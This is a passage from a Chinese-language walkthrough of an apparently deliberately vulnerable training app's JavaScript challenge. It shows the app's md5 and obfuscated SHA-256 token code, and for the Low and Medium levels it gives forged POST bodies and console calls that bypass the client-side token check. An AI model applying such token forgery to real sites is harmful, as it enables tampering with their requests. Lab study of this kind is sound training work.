class="number">8</span>*n.length)),r=<span class="number">0</span>;r&lt;<span class="number">16</span>;r+=<span class="number">1</span>)u[r]=<span class="number">909522486</span>^o[r],c[r]=<span class="number">1549556828</span>^o[r];<span class="keyword">return</span> e=i(u.concat(d(t)),<span class="number">512</span>+<span class="number">8</span>*t.length),a(i(c.concat(e),<span class="number">640</span>))&#125;<span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params">n</span>)</span>&#123;<span class="keyword">var</span> t,r,e=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(r=<span class="number">0</span>;r&lt;n.length;r+=<span class="number">1</span>)t=n.charCodeAt(r),e+=<span class="string">&quot;0123456789abcdef&quot;</span>.charAt(t&gt;&gt;&gt;<span class="number">4</span>&amp;<span class="number">15</span>)+<span class="string">&quot;0123456789abcdef&quot;</span>.charAt(<span class="number">15</span>&amp;t);<span class="keyword">return</span> e&#125;<span class="function"><span class="keyword">function</span> <span class="title">v</span>(<span class="params">n</span>)</span>&#123;<span class="keyword">return</span> unescape(encodeURIComponent(n))&#125;<span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params">n</span>)</span>&#123;<span class="keyword">return</span> h(v(n))&#125;<span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params">n</span>)</span>&#123;<span class="keyword">return</span> g(m(n))&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params">n,t</span>)</span>&#123;<span class="keyword">return</span> l(v(n),v(t))&#125;<span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params">n,t</span>)</span>&#123;<span class="keyword">return</span> g(s(n,t))&#125;<span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params">n,t,r</span>)</span>&#123;<span class="keyword">return</span> t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;<span class="string">&quot;function&quot;</span>==typeof define&amp;&amp;define.amd?define(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> A&#125;):<span class="string">&quot;object&quot;</span>==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rot13</span>(<span class="params">inp</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> inp.replace(/[a-zA-Z]/g,<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="keyword">String</span>.fromCharCode((c&lt;=<span class="string">&quot;Z&quot;</span>?<span class="number">90</span>:<span class="number">122</span>)&gt;=(c=c.charCodeAt(<span class="number">0</span>)+<span class="number">13</span>)?c:c<span class="number">-26</span>);&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> phrase = document.getElementById(<span class="string">&quot;phrase&quot;</span>).value;</span><br><span class="line">        document.getElementById(<span class="string">&quot;token&quot;</span>).value = md5(rot13(phrase));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    generate_token();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>主要生成了一个 <code>token</code> 通过 JS 在浏览器端生成, 由 <code>md5(rot13(phrase))</code> </p>
<h3 id="漏洞利用-39"><a href="#漏洞利用-39" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接在浏览器控制台(Console) 调用函数计算出 <code>token</code> 值， <code>md5(rot13(success));</code> &gt;&gt; <code>38581812b435834ebf84ebcc2c6424d6</code> &gt;&gt; 使用 Hackbar 修改 Post data ：<code>token=38581812b435834ebf84ebcc2c6424d6&amp;phrase=success&amp;send=Submit</code> &gt;&gt; Well done!</p>
<h2 id="Medium-13"><a href="#Medium-13" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-49"><a href="#源码-49" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= &lt;&lt;&lt;EOF</span><br><span class="line">&lt;script src=<span class="string">&quot;/vulnerabilities/javascript/source/medium.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><figcaption><span>/vulnerabilities/javascript/source/medium.js</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="string">&quot;&quot;</span>,n=e.length-<span class="number">1</span>;n&gt;=<span class="number">0</span>;n--)t+=e[n];<span class="keyword">return</span> t&#125;<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;do_elsesomething(<span class="string">&quot;XX&quot;</span>)&#125;,<span class="number">300</span>);<span class="function"><span class="keyword">function</span> <span class="title">do_elsesomething</span>(<span class="params">e</span>)</span>&#123;<span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value=do_something(e+<span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value+<span class="string">&quot;XX&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
<p>通过源码可知 <code>phrase</code> 逆序输出，然后在前后分别添加 <code>XX</code> 作为规律 &gt;&gt; 默认的 <code>ChangeMe</code> 的 token : <code>&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;XXeMegnahCXX&quot; id=&quot;token&quot;&gt;</code> &gt;&gt; <code>success</code> 的 token 应该是 <code>XXsseccusXX</code> </p>
<h3 id="漏洞利用-40"><a href="#漏洞利用-40" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用 hackbar 修改 Post data:  <code>token=XXsseccusXX&amp;phrase=success&amp;send=Submit</code></p>
<h2 id="High-13"><a href="#High-13" class="headerlink" title="High"></a>High</h2><h3 id="源码-50"><a href="#源码-50" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= &lt;&lt;&lt;EOF</span><br><span class="line">&lt;script src=<span class="string">&quot;/vulnerabilities/javascript/source/high.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="string">&#x27;fromCharCode&#x27;</span>,<span class="string">&#x27;toString&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;BeJ&#x27;</span>,<span class="string">&#x27;\x5cw+&#x27;</span>,<span class="string">&#x27;Lyg&#x27;</span>,<span class="string">&#x27;SuR&#x27;</span>,<span class="string">&#x27;(w()&#123;\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:&#123;&#125;;p(Y.3N)&#123;1R=1O&#125;q\x202L=!1R&amp;&amp;1c\x202M===\x271n\x27;q\x202o=!Y.2S&amp;&amp;1c\x202d===\x271n\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o)&#123;Y=3R&#125;z\x20p(2L)&#123;Y=2M&#125;q\x202G=!Y.3Q&amp;&amp;1c\x202g===\x271n\x27&amp;&amp;2g.X;q\x202s=1c\x202l===\x27w\x27&amp;&amp;2l.3P;q\x201y=!Y.3H&amp;&amp;1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K)&#123;1z.1K=w(1x)&#123;A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27&#125;&#125;p(1y&amp;&amp;(Y.50||!Z.1N))&#123;Z.1N=w(1x)&#123;A\x201c\x201x===\x271n\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z&#125;&#125;q\x202m=w(1X,x)&#123;A\x20w(s)&#123;A\x20O\x20N(x,1d).S(s)[1X]()&#125;&#125;;q\x202a=w(x)&#123;q\x20P=2m(\x271e\x27,x);p(2o)&#123;P=2P(P,x)&#125;P.1T=w()&#123;A\x20O\x20N(x)&#125;;P.S=w(s)&#123;A\x20P.1T().S(s)&#125;;1g(q\x20i=0;i&lt;1E.W;++i)&#123;q\x20T=1E[i];P[T]=2m(T,x)&#125;A\x20P&#125;;q\x202P=w(P,x)&#123;q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s)&#123;p(1c\x20s===\x272p\x27)&#123;A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)&#125;z&#123;p(s===2q||s===2T)&#123;1u\x20O\x201t(1l)&#125;z\x20p(s.1J===Z)&#123;s=O\x202r(s)&#125;&#125;p(1z.1K(s)||Z.1N(s)||s.1J===1Y)&#123;A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)&#125;z&#123;A\x20P(s)&#125;&#125;;A\x202z&#125;;q\x202k=w(1X,x)&#123;A\x20w(G,s)&#123;A\x20O\x201P(G,x,1d).S(s)[1X]()&#125;&#125;;q\x202f=w(x)&#123;q\x20P=2k(\x271e\x27,x);P.1T=w(G)&#123;A\x20O\x201P(G,x)&#125;;P.S=w(G,s)&#123;A\x20P.1T(G).S(s)&#125;;1g(q\x20i=0;i&lt;1E.W;++i)&#123;q\x20T=1E[i];P[T]=2k(T,x)&#125;A\x20P&#125;;w\x20N(x,1v)&#123;p(1v)&#123;l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l&#125;z&#123;k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]&#125;p(x)&#123;k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T&#125;z&#123;k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s&#125;k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x&#125;N.Q.S=w(s)&#123;p(k.1U)&#123;A&#125;q\x202h,T=1c\x20s;p(T!==\x272p\x27)&#123;p(T===\x271n\x27)&#123;p(s===2q)&#123;1u\x20O\x201t(1l)&#125;z\x20p(1y&amp;&amp;s.1J===Z)&#123;s=O\x202r(s)&#125;z\x20p(!1z.1K(s))&#123;p(!1y||!Z.1N(s))&#123;1u\x20O\x201t(1l)&#125;&#125;&#125;z&#123;1u\x20O\x201t(1l)&#125;2h=1d&#125;q\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W)&#123;p(k.1L)&#123;k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0&#125;p(2h)&#123;1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M)&#123;l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]&#125;&#125;z&#123;1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M)&#123;r=s.1Q(M);p(r&lt;R)&#123;l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]&#125;z\x20p(r&lt;2v)&#123;l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]&#125;z\x20p(r&lt;2A||r&gt;=2E)&#123;l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]&#125;z&#123;r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]&#125;&#125;&#125;k.2u=i;k.L+=i-k.1A;p(i&gt;=1k)&#123;k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d&#125;z&#123;k.1A=i&#125;&#125;p(k.L&gt;4r)&#123;k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H&#125;A\x20k&#125;;N.Q.1s=w()&#123;p(k.1U)&#123;A&#125;k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q)&#123;p(!k.1L)&#123;k.1W()&#125;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0&#125;l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()&#125;;N.Q.1W=w()&#123;q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j)&#123;v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0&#125;1D=b&amp;c;1g(j=0;j&lt;1k;j+=4)&#123;p(k.2j)&#123;p(k.x)&#123;1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0&#125;z&#123;1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0&#125;k.2j=1O&#125;z&#123;1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0&#125;1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0&#125;k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0&#125;;N.Q.1e=w()&#123;k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x)&#123;1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]&#125;A\x201e&#125;;N.Q.2U=N.Q.1e;N.Q.1G=w()&#123;k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x)&#123;2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)&#125;A\x202b&#125;;N.Q.27=N.Q.1G;N.Q.2R=w()&#123;k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x)&#123;1i.1p(28,k.D)&#125;A\x201w&#125;;w\x201P(G,x,1v)&#123;q\x20i,T=1c\x20G;p(T===\x272p\x27)&#123;q\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i)&#123;r=G.1Q(i);p(r&lt;R)&#123;L[M++]=r&#125;z\x20p(r&lt;2v)&#123;L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))&#125;z\x20p(r&lt;2A||r&gt;=2E)&#123;L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))&#125;z&#123;r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))&#125;&#125;G=L&#125;z&#123;p(T===\x271n\x27)&#123;p(G===2q)&#123;1u\x20O\x201t(1l)&#125;z\x20p(1y&amp;&amp;G.1J===Z)&#123;G=O\x202r(G)&#125;z\x20p(!1z.1K(G))&#123;p(!1y||!Z.1N(G))&#123;1u\x20O\x201t(1l)&#125;&#125;&#125;z&#123;1u\x20O\x201t(1l)&#125;&#125;p(G.W&gt;1k)&#123;G=(O\x20N(x,1d)).S(G).27()&#125;q\x201F=[],2e=[];1g(i=0;i&lt;1k;++i)&#123;q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b&#125;N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v&#125;1P.Q=O\x20N();1P.Q.1s=w()&#123;N.Q.1s.1I(k);p(k.2c)&#123;k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)&#125;&#125;;q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G)&#123;2g.X=X&#125;z&#123;Y.1q=X.1q;Y.1H=X.1H;p(2s)&#123;2l(w()&#123;A\x20X&#125;)&#125;&#125;&#125;)();w\x202y(e)&#123;1g(q\x20t=\x22\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\x20t&#125;w\x202J(t,y=\x224B\x22)&#123;1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)&#125;w\x202B(e=\x224E\x22)&#123;1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)&#125;w\x202K(a,b)&#123;1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)&#125;1m.1o(\x222F\x22).1r=\x22\x22;4u(w()&#123;2B(\x224M\x22)&#125;,4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);&#x27;</span>,<span class="string">&#x27;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#x27;</span>,<span class="string">&#x27;split&#x27;</span>];(<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;<span class="keyword">var</span> e=<span class="function"><span class="keyword">function</span>(<span class="params">f</span>)</span>&#123;<span class="keyword">while</span>(--f)&#123;c[<span class="string">&#x27;push&#x27;</span>](c[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;e(++d);&#125;(a,<span class="number">0x1f4</span>));<span class="keyword">var</span> b=<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;c=c-<span class="number">0x0</span>;<span class="keyword">var</span> e=a[c];<span class="keyword">return</span> e;&#125;;<span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">d,e,f,g,h,i</span>)</span>&#123;h=<span class="function"><span class="keyword">function</span>(<span class="params">j</span>)</span>&#123;<span class="keyword">return</span>(j&lt;e?<span class="string">&#x27;&#x27;</span>:h(<span class="built_in">parseInt</span>(j/e)))+((j=j%e)&gt;<span class="number">0x23</span>?<span class="built_in">String</span>[b(<span class="string">&#x27;0x0&#x27;</span>)](j+<span class="number">0x1d</span>):j[b(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x24</span>));&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>[b(<span class="string">&#x27;0x2&#x27;</span>)](<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(f--)&#123;i[h(f)]=g[f]||h(f);&#125;g=[<span class="function"><span class="keyword">function</span>(<span class="params">k</span>)</span>&#123;<span class="keyword">if</span>(<span class="string">&#x27;wpA&#x27;</span>!==b(<span 